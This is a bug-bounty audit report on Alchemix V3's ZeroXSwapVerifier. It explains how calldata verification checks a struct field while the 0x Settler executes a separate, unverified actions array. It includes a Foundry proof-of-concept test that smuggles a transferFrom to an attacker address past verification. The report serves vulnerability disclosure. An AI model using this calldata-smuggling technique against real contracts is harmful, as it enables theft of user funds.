# 58124 sc low direct theft of funds via malicious actions in execute call due to incorrect calldata verification

**Submitted on Oct 30th 2025 at 19:34:39 UTC by @dldLambda for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58124
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

ZeroXSwapVerifier.verifySwapCalldata() verifies saa.actions from the SlippageAndActions struct, but the Settler executes the real actions\[] parameter, which is not verified.

## Vulnerability Details

The ZeroXSwapVerifier.verifySwapCalldata() function is intended to validate calldata from the 0x API before forwarding it to the 0x Settler contract for execution. However, it incorrectly decodes and verifies the execute() calldata by only checking the saa.actions field within the SlippageAndActions struct, while completely ignoring the actual actions\[] parameter passed to the execute() function.

The real execute() function in the 0x Settler contract has the following signature:

```
function execute(
    SlippageAndActions calldata slippage,
    bytes[] calldata actions,
    bytes32 affiliateData
) external;
```

It executes the actions\[] array, not slippage.actions.

Since verifySwapCalldata() only checks saa.actions and never inspects the real actions\[], an attacker can craft calldata where:

saa.actions contains a benign action (e.g., BASIC\_SELL\_TO\_POOL) The actual actions\[] parameter contains a malicious action (e.g., transferFrom to the attacker's address)

The verification will pass, but the Settler will execute the malicious transferFrom, stealing all user funds from the calling contract.

The AllowedSlippage struct contains only 3 fields (Settler.sol):

```
    struct AllowedSlippage {
        address payable recipient;
        IERC20 buyToken;
        uint256 minAmountOut;
    }
```

However, ZeroXSwapVerifier defines a custom struct:

```
    struct SlippageAndActions {
        address recipient;
        address buyToken;
        uint256 minAmountOut;
        bytes[] actions;
    }
```

And decodes calldata as:

```
(SlippageAndActions memory saa, ) = abi.decode(data, (SlippageAndActions, bytes));
```

The library checks saa.actions, while the real actions\[] parameter is never verified.

The Settler contract executes the actions\[] parameter (Settler.sol):

```
                (uint256 action, bytes calldata data) = actions.decodeCall(it);
                if (!_dispatchVIP(action, data)) {
                    if (!_dispatch(0, action, data)) {
```

The attacker can compose a special calldata with a good and acceptable saa.actions, but with a bad malicious actions\[], which will ultimately be executed.

## Impact Details

An attacker can steal funds by replacing actions\[] with transferFrom, bypassing verifySwapCalldata() since a non-executable parameter is checked.

## References

<https://github.com/0xProject/0x-settler/blob/c3bb63e1ba3514dc694455610ad91b52c78fe24b/src/Settler.sol#L114> - execute function

<https://github.com/0xProject/0x-settler/blob/master/src/interfaces/ISettlerBase.sol>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>

## Proof of Concept

## Proof of Concept

Add this test and run:

```
// test/ZeroXSwapVerifierAttack.t.sol
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

contract ZeroXSwapVerifierAttackTest is Test {
    TestERC20 token;
    address user = address(0x1111);
    address attacker = address(0x2222);

    bytes4 constant EXECUTE_SELECTOR = 0xcf71ff4f;

    function setUp() public {
        token = new TestERC20(1000e18, 18);
        deal(address(token), user, 100e18);
    }

    function testAttack_MaliciousActionsInCalldata() public {
       
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: user,
            buyToken: address(token),
            minAmountOut: 0,
            actions: new bytes[](0)
        });

       
        bytes[] memory maliciousActions = new bytes[](1);
        maliciousActions[0] = abi.encodeWithSelector(
            0x8d68a156, // transferFrom
            address(token),
            user,
            attacker,
            100e18
        );

        bytes32 affiliateData = bytes32(0);

        
        bytes memory calldata_ = abi.encodeWithSelector(
            EXECUTE_SELECTOR,
            saa,
            maliciousActions,
            affiliateData
        );

        
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            calldata_,
            user,
            address(token),
            1000
        );

        assertTrue(verified, "Malicious actions!");
    }
}
```

You will see:

```
Ran 1 test for src/test/my-test2.t.sol:ZeroXSwapVerifierAttackTest
[PASS] testAttack_MaliciousActionsInCalldata() (gas: 20627)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17ms (59.00µs CPU time)
```
